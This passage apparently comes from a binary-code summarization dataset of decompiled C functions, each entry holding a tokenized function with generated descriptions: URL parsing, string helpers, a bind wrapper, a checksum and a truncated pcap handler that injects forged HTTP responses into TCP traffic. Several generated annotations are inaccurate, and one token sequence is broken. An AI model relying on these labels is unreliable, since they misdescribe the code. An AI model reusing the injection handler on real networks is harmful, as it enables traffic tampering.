            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v5",
            "=",
            "qword_F948",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F948",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v5",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v5",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v5",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v6",
            "=",
            "qword_F950",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F950",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v6",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v6",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v6",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v6",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v7",
            "=",
            "qword_F958",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F958",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v7",
            "+",
            "136",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "v7",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v7",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v7",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "v8",
            "=",
            "ipstr",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "ipstr",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "+",
            "17",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v8",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v8",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v8",
            "+",
            "8",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "144",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "returnparts",
            "=",
            "\"scheme\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "returnparts",
            "+",
            "8",
            ")",
            "=",
            "58",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F928",
            "=",
            "\"userid\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F928",
            "+",
            "8",
            ")",
            "=",
            "64",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F930",
            "=",
            "\"password\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F930",
            "+",
            "8",
            ")",
            "=",
            "58",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F938",
            "=",
            "\"host\"",
            ";",
            "v9",
            "=",
            "qword_F938",
            "+",
            "8",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F938",
            "+",
            "8",
            ")",
            "=",
            "12079",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v9",
            "+",
            "2",
            ")",
            "=",
            "0",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F940",
            "=",
            "\"port\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F940",
            "+",
            "8",
            ")",
            "=",
            "58",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F948",
            "=",
            "\"path\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F948",
            "+",
            "8",
            ")",
            "=",
            "47",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F950",
            "=",
            "\"param\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F950",
            "+",
            "8",
            ")",
            "=",
            "59",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "qword_F958",
            "=",
            "\"query\"",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "qword_F958",
            "+",
            "8",
            ")",
            "=",
            "63",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "ipstr",
            "=",
            "\"fragment\"",
            ";",
            "result",
            "=",
            "ipstr",
            "+",
            "8",
            ";",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "ipstr",
            "+",
            "4",
            ")",
            "=",
            "35",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `malloc` is used for dynamic memory allocation in C programming, typically to allocate memory for variables or data structures during runtime, allowing programs to utilize memory as needed and manage resources efficiently.",
            "The `alloc` function appears to be a part of a larger system or library, likely related to memory allocation and management, potentially involving contexts, arenas, and possibly integration with filesystem-related functionalities.",
            "The `memset` function is utilized for memory setting, likely aiming for efficiency and portability, with different implementations tailored for specific architectures and environments, such as custom implementations and leveraging built-in functions like `__builtin_memset`."
        ],
        "longer_label": "The provided code defines a function `setupparts` which dynamically allocates memory for various parts of a system or library, initializes them with specific strings and sizes, likely for handling different aspects of a network communication protocol, and returns a pointer to the allocated memory."
    },
    {
        "id": 398,
        "docstring_tokens": [
            "The",
            "code",
            "parses",
            "a",
            "given",
            "URL",
            "and",
            "extracts",
            "different",
            "parts",
            "such",
            "as",
            "scheme",
            ",",
            "host",
            ",",
            "username",
            ",",
            "password",
            ",",
            "and",
            "path",
            ",",
            "returning",
            "the",
            "parsed",
            "parts",
            "through",
            "a",
            "struct",
            "pointer",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "_QWORD",
            "*",
            "a2",
            ")",
            "{",
            "size_t",
            "v3",
            ";",
            "const",
            "char",
            "*",
            "v4",
            ";",
            "signed",
            "int",
            "i",
            ";",
            "const",
            "char",
            "*",
            "v6",
            ";",
            "const",
            "char",
            "*",
            "v7",
            ";",
            "const",
            "char",
            "*",
            "v8",
            ";",
            "const",
            "char",
            "*",
            "v9",
            ";",
            "signed",
            "int",
            "v10",
            ";",
            "char",
            "*",
            "dest",
            ";",
            "const",
            "char",
            "*",
            "v12",
            ";",
            "if",
            "(",
            "*",
            "a1",
            ")",
            "{",
            "v3",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "dest",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "v3",
            "+",
            "1",
            ")",
            ";",
            "if",
            "(",
            "!",
            "dest",
            ")",
            "{",
            "puts",
            "(",
            "\"cannot allocate memory\"",
            ")",
            ";",
            "exit",
            "(",
            "-",
            "1",
            ")",
            ";",
            "}",
            "strcpy",
            "(",
            "dest",
            ",",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "firstpunc",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "dest",
            ")",
            "=",
            "=",
            "58",
            ")",
            "{",
            "v4",
            "=",
            "strsplit",
            "(",
            "dest",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "*",
            "a2",
            "+",
            "8L",
            "L",
            ")",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "*",
            "a2",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "v4",
            ")",
            ";",
            "strleft",
            "(",
            "dest",
            ",",
            "1u",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "*",
            "a2",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "\"mailto\"",
            ")",
            ")",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "3",
            "]",
            "+",
            "8L",
            "L",
            ")",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            "<",
            "=",
            "8",
            "&",
            "&",
            "*",
            "dest",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "i",
            "&",
            "&",
            "i",
            "!",
            "=",
            "1",
            "&",
            "&",
            "i",
            "!",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "i",
            "=",
            "=",
            "3",
            "&",
            "&",
            "strchr",
            "(",
            "dest",
            ",",
            "64",
            ")",
            ")",
            "{",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "dest",
            ",",
            "\"",
            "strleft",
            "(",
            "dest",
            ",",
            "2u",
            ")",
            ";",
            "v6",
            "=",
            "strsplit",
            "(",
            "dest",
            ",",
            "\":@\"",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "1",
            "]",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "v6",
            ")",
            ";",
            "strleft",
            "(",
            "dest",
            ",",
            "1u",
            ")",
            ";",
            "if",
            "(",
            "strchr",
            "(",
            "dest",
            ",",
            "64",
            ")",
            ")",
            "{",
            "v7",
            "=",
            "strsplit",
            "(",
            "dest",
            ",",
            "\"@\"",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "2",
            "]",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "v7",
            ")",
            ";",
            "strleft",
            "(",
            "dest",
            ",",
            "1u",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "3",
            "]",
            "+",
            "8L",
            "L",
            ")",
            "=",
            "0",
            ";",
            "}",
            "if",
            "(",
            "i",
            "=",
            "=",
            "5",
            "&",
            "&",
            "!",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "*",
            "a2",
            "+",
            "12L",
            "L",
            ")",
            ")",
            "{",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "5",
            "]",
            "+",
            "8L",
            "L",
            ")",
            "=",
            "0",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "*",
            "a2",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "\"http\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            "=",
            "=",
            "5",
            ")",
            "v8",
            "=",
            "\":;?#\"",
            ";",
            "else",
            "v8",
            "=",
            "\":/;?#\"",
            ";",
            "v12",
            "=",
            "v8",
            ";",
            "v10",
            "=",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "i",
            "]",
            "+",
            "8L",
            "L",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "dest",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "i",
            "]",
            "+",
            "8L",
            "L",
            ")",
            ",",
            "v10",
            ")",
            ")",
            "{",
            "strleft",
            "(",
            "dest",
            ",",
            "v10",
            ")",
            ";",
            "v9",
            "=",
            "strsplit",
            "(",
            "dest",
            ",",
            "v12",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a2",
            "[",
            "i",
            "]",
            "+",
            "12L",
            "L",
            ")",
            ",",
            "v9",
            ")",
            ";",
            "}",
            "}",
            "}",
            "if",
            "(",
            "*",
            "dest",
            ")",
            "sprintf",
            "(",
            "parseError",
            ",",
            "\"I don't understand '%s'\"",
            ",",
            "dest",
            ")",
            ";",
            "free",
            "(",
            "dest",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "strcpy",
            "(",
            "parseError",
            ",",
            "\"nothing to do!\\n\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function is a memory allocation function typically used in C programming to allocate a specified amount of memory dynamically, allowing for flexible memory management within a program."
        ],
        "longer_label": "The provided code is a C function `parseURL` that parses a URL string, dynamically allocates memory using `malloc`, extracts various components of the URL, handles special cases such as `mailto`, and generates error messages if the URL format is not recognized."
    },
    {
        "id": 399,
        "docstring_tokens": [
            "The",
            "code",
            "replaces",
            "occurrences",
            "of",
            "a",
            "specified",
            "substring",
            "in",
            "a",
            "given",
            "string",
            "with",
            "another",
            "substring",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "str_replace",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ",",
            "const",
            "char",
            "*",
            "a3",
            ")",
            "{",
            "size_t",
            "v4",
            ";",
            "char",
            "*",
            "v5",
            ";",
            "char",
            "*",
            "haystack",
            ";",
            "int",
            "i",
            ";",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "const",
            "char",
            "*",
            "v12",
            ";",
            "unsigned",
            "int",
            "v13",
            ";",
            "char",
            "*",
            "dest",
            ";",
            "char",
            "*",
            "desta",
            ";",
            "char",
            "*",
            "v16",
            ";",
            "haystack",
            "=",
            "(",
            "char",
            "*",
            ")",
            "a1",
            ";",
            "if",
            "(",
            "!",
            "a1",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "a2",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v10",
            "=",
            "strlen",
            "(",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v10",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "v12",
            "=",
            "strstr",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v12",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "a3",
            ")",
            "a3",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "&",
            "unk_94D8",
            ";",
            "v11",
            "=",
            "strlen",
            "(",
            "a3",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "dest",
            "=",
            "strstr",
            "(",
            "v12",
            ",",
            "a2",
            ")",
            ";",
            "if",
            "(",
            "!",
            "dest",
            ")",
            "break",
            ";",
            "v12",
            "=",
            "&",
            "dest",
            "[",
            "v10",
            "]",
            ";",
            "}",
            "v4",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "v16",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "i",
            "*",
            "(",
            "v11",
            "-",
            "v10",
            ")",
            "+",
            "v4",
            "+",
            "1",
            ")",
            ";",
            "desta",
            "=",
            "v16",
            ";",
            "if",
            "(",
            "!",
            "v16",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "i",
            "-",
            "-",
            ")",
            "{",
            "v13",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "strstr",
            "(",
            "haystack",
            ",",
            "a2",
            ")",
            ";",
            "v5",
            "=",
            "strncpy",
            "(",
            "desta",
            ",",
            "haystack",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "(",
            "_DWORD",
            ")",
            "haystack",
            ")",
            ")",
            ";",
            "desta",
            "=",
            "&",
            "strcpy",
            "(",
            "&",
            "v5",
            "[",
            "v13",
            "-",
            "(",
            "_DWORD",
            ")",
            "haystack",
            "]",
            ",",
            "a3",
            ")",
            "[",
            "v11",
            "]",
            ";",
            "haystack",
            "+",
            "=",
            "(",
            "int",
            ")",
            "(",
            "v13",
            "-",
            "(",
            "_DWORD",
            ")",
            "haystack",
            "+",
            "v10",
            ")",
            ";",
            "}",
            "strcpy",
            "(",
            "desta",
            ",",
            "haystack",
            ")",
            ";",
            "return",
            "v16",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `alloc` function appears to be part of a larger program or library dealing with memory allocation, possibly managing memory arenas and contexts, including functionalities such as allocating, reallocating, and freeing memory, as well as handling error messages and interacting with a FUSE file system.",
            "The `strncpy` function is used to copy at most `n` characters from the source string to the destination string, ensuring no more than `n` characters are copied and automatically appending a null terminator if the source string is shorter than `n`."
        ],
        "longer_label": "The provided code is a fastcall function `str_replace` designed to replace occurrences of a substring `a2` with another substring `a3` in a given string `a1`, with annotations indicating its integration within a larger memory management system and the use of `strncpy` for safe string copying."
    },
    {
        "id": 400,
        "docstring_tokens": [
            "The",
            "function",
            "strsplit",
            "takes",
            "a",
            "string",
            "s",
            "and",
            "a",
            "token",
            "tok",
            "as",
            "input",
            ",",
            "splits",
            "the",
            "string",
            "s",
            "at",
            "the",
            "first",
            "occurrence",
            "of",
            "the",
            "token",
            "tok",
            ",",
            "and",
            "returns",
            "the",
            "resulting",
            "substring",
            "before",
            "the",
            "token",
            "."
        ],
        "code_tokens": [
            "_BYTE",
            "*",
            "FUN0",
            "strsplit",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "v3",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "a1",
            "[",
            "i",
            "]",
            "&",
            "&",
            "i",
            "<",
            "=",
            "254",
            "&",
            "&",
            "!",
            "strchr",
            "(",
            "a2",
            ",",
            "(",
            "char",
            ")",
            "a1",
            "[",
            "i",
            "]",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "out_5720",
            "[",
            "i",
            "]",
            "=",
            "a1",
            "[",
            "i",
            "]",
            ";",
            "out_5720",
            "[",
            "i",
            "]",
            "=",
            "0",
            ";",
            "if",
            "(",
            "i",
            "&",
            "&",
            "a1",
            "[",
            "i",
            "]",
            ")",
            "{",
            "v3",
            "=",
            "0",
            ";",
            "while",
            "(",
            "a1",
            "[",
            "i",
            "]",
            ")",
            "a1",
            "[",
            "v3",
            "+",
            "+",
            "]",
            "=",
            "a1",
            "[",
            "i",
            "+",
            "+",
            "]",
            ";",
            "a1",
            "[",
            "v3",
            "]",
            "=",
            "0",
            ";",
            "}",
            "else",
            "if",
            "(",
            "!",
            "a1",
            "[",
            "i",
            "]",
            ")",
            "{",
            "*",
            "a1",
            "=",
            "0",
            ";",
            "}",
            "return",
            "out_5720",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `split` appears to be intended for dividing a string into individual words, possibly for processing or manipulation within a program."
        ],
        "longer_label": "The provided code is a function named `strsplit` designed to split a given string `a1` into individual words based on a delimiter string `a2`, storing the result in `out_5720`, while ensuring a maximum word length of 254 characters and handling cases where no delimiter is found or the input string is empty."
    },
    {
        "id": 401,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "setBind",
            "that",
            "binds",
            "a",
            "file",
            "descriptor",
            "to",
            "a",
            "specified",
            "address",
            "and",
            "port",
            ",",
            "returning",
            "-1",
            "if",
            "the",
            "binding",
            "fails",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "addrinfo",
            "*",
            "p",
            ")",
            "{",
            "int",
            "r",
            ";",
            "r",
            "=",
            "bind",
            "(",
            "fd",
            ",",
            "p",
            "-",
            ">",
            "ai_addr",
            ",",
            "p",
            "-",
            ">",
            "ai_addrlen",
            ")",
            ";",
            "if",
            "(",
            "r",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"bind\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "r",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `perror` is used to print a descriptive error message to the standard error stream, typically after a failed system call, indicating the error based on the error number stored in the global variable `errno`."
        ],
        "longer_label": "The given code defines a function `setBind` which attempts to bind a socket to a specified address and port, utilizing the provided file descriptor and address information; if the bind operation fails, it prints a descriptive error message using `perror` and exits with an error code."
    },
    {
        "id": 402,
        "docstring_tokens": [
            "The",
            "function",
            "returns",
            "the",
            "first",
            "non-alphanumeric",
            "character",
            "in",
            "the",
            "input",
            "string",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int8",
            "*",
            "a1",
            ")",
            "{",
            "unsigned",
            "__int8",
            "*",
            "v2",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v2",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "if",
            "(",
            "!",
            "*",
            "v2",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "(",
            "*",
            "__ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "(",
            "char",
            ")",
            "*",
            "a1",
            "]",
            "&",
            "8",
            ")",
            "=",
            "=",
            "0",
            ")",
            "return",
            "*",
            "a1",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function named \"firstpunc\" which iterates through a given unsigned byte array until it encounters the first punctuation character, using a bitwise AND operation with a ctype lookup table, returning the character if found or 0 if none are present."
    },
    {
        "id": 403,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "removes",
            "the",
            "first",
            "n",
            "characters",
            "from",
            "a",
            "given",
            "string",
            ",",
            "returning",
            "-1",
            "if",
            "n",
            "is",
            "greater",
            "than",
            "the",
            "string",
            "length",
            ",",
            "and",
            "setting",
            "the",
            "string",
            "to",
            "empty",
            "if",
            "n",
            "is",
            "equal",
            "to",
            "the",
            "string",
            "length",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "v3",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "<",
            "(",
            "int",
            ")",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "a2",
            ")",
            "*",
            "a1",
            "=",
            "0",
            ";",
            "memmove",
            "(",
            "a1",
            ",",
            "&",
            "a1",
            "[",
            "a2",
            "]",
            ",",
            "(",
            "int",
            ")",
            "(",
            "v3",
            "-",
            "a2",
            "+",
            "1",
            ")",
            ")",
            ";",
            "return",
            "a2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `strlen` is being redefined and implemented in the provided code snippets, likely for optimization purposes, as part of a larger program that appears to handle string manipulation and conversion operations in a compact and efficient manner."
        ],
        "longer_label": "The provided code defines a function `strleft` which optimizes string manipulation by redefining and implementing `strlen`, ensuring efficient left-truncation of a string based on a specified length."
    },
    {
        "id": 404,
        "docstring_tokens": [
            "The",
            "function",
            "calculates",
            "the",
            "checksum",
            "value",
            "for",
            "a",
            "given",
            "buffer",
            "of",
            "data",
            "and",
            "count",
            "of",
            "bytes",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "__int16",
            "*",
            "a1",
            ",",
            "unsigned",
            "__int16",
            "a2",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "__int16",
            "*",
            "v3",
            ";",
            "v2",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "a2",
            ">",
            "1u",
            ")",
            "{",
            "v3",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "v2",
            "+",
            "=",
            "*",
            "v3",
            ";",
            "a2",
            "-",
            "=",
            "2",
            ";",
            "}",
            "if",
            "(",
            "a2",
            ")",
            "v2",
            "+",
            "=",
            "htons",
            "(",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "a1",
            "<",
            "<",
            "8",
            ")",
            ";",
            "while",
            "(",
            "v2",
            ">",
            ">",
            "16",
            ")",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v2",
            "+",
            "(",
            "v2",
            ">",
            ">",
            "16",
            ")",
            ";",
            "return",
            "(",
            "unsigned",
            "int",
            ")",
            "~",
            "(",
            "_DWORD",
            ")",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code calculates a checksum for an array of unsigned 16-bit integers, summing them up, adjusting for odd lengths, and performing bitwise operations to ensure the checksum fits within 16 bits, returning the complement of the result."
    },
    {
        "id": 405,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "packet",
            "handler",
            "function",
            "that",
            "processes",
            "incoming",
            "Ethernet",
            "packets",
            ",",
            "swaps",
            "addresses",
            "and",
            "sequences",
            ",",
            "injects",
            "a",
            "custom",
            "HTTP",
            "response",
            "for",
            "TCP",
            "packets",
            "with",
            "specific",
            "flags",
            ",",
            "recalculates",
            "checksums",
            ",",
            "and",
            "injects",
            "modified",
            "packets",
            "back",
            "into",
            "the",
            "network",
            "using",
            "a",
            "pcap",
            "library",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "my_pcap_handler",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "_WORD",
            "*",
            "a3",
            ")",
            "{",
            "__int16",
            "v3",
            ";",
            "_WORD",
            "*",
            "v5",
            ";",
            "void",
            "*",
            "v6",
            ";",
            "void",
            "*",
            "src",
            ";",
            "char",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "while",
            "(",
            "&",
            "v8",
            "!",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "&",
            "v9",
            "-",
            "0x2000",
            ")",
            ")",
            ";",
            "v5",
            "=",
            "a3",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v6",
            "=",
            "a3",
            ";",
            "v3",
            "=",
            "a3",
            "[",
            "6",
            "]",
            ";",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "htons",
            "(",
            "0x800u",
            ")",
            "&",
            "&",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v5",
            "+",
            "14",
            ")",
            ">",
            ">",
            "4",
            "=",
            "=",
            "4",
            "&",
            "&",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v5",
            "+",
            "23",
            ")",
            "=",
            "=",
            "6",
            ")",
            "{",
            "src",
            "=",
            "&",
            "v5",
            "[",
            "2",
            "*",
            "(",
            "v5",
            "[",
            "7",
            "]",
            "&",
            "0xF",
            ")",
            "+",
            "7",
            "]",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "^",
            "=",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "6",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "+",
            "6",
            ")",
            "^",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "v6",
            "^",
            "=",
            "*",
